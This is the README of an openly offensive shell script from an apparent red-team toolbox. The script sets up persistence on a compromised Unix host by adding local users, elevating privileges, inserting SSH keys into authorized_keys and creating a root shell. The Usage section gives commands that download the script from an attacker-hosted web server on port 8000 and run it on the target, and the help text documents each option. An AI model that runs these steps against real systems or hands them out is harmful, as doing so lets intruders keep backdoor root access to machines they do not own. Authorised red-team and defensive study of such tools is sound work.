# Persistence Phase

In this phase, an attempt is made to maintain persistence on the host or network. This is to maintain access to the compromised system, even if the system is rebooted or credentials are changed, for example. This includes creating new accounts or securing access via SSH, among other things.

With this script it is possible to apply some persistence techniques to get a foothold on a system.

## Features

- Create local user
- Elevate privileges
- Modify ssh keys
- Create a root shell

## Usage

From github:
```sh
curl -LJO https://github.com/McSquizzy/red-team-toolbox/blob/main/persistence/persistence.sh
sh persistence.sh -h
```
Local network:
```sh
# Host:
sh persistence.sh -w
# Target:
curl -LJO <Host>:8000/persistence.sh #or
curl <Host>:8000/persistence.sh > persistence.sh #or
wget <Host>:8000/persistence.sh
sh persistence.sh -h
```

### Parameters

```
sh persistence.sh -h

Usage: persistence.sh [options]

Options:
-h                Show this help message
-e <username>     Elevate privileges of the given user
                  Root needed!
-r                Create a root shell
                  Root needed!
-s <ssh pub key>  Trying to add ssh public key to authorized_keys of current user
                  Put the contents of your public key in quotes like: -s "ssh-rsa AAAAB3NcaDkL......"
-u <username>     Add a local account/user
                  Only useful in combination with -p parameter
                  Root needed!
-p <password>     Set this password to new or existent user
                  Root needed!
-w                Serves a local web server for transferring files

Output:
-q                Quiet. No banner and no advisory displayed
```

## Results

The results are printed directly to STDOUT.

## Compatibility

The script uses /bin/sh syntax and is fully POSIX compatible so can run on most unix-based (POSIX/Unix/Linux) systems. 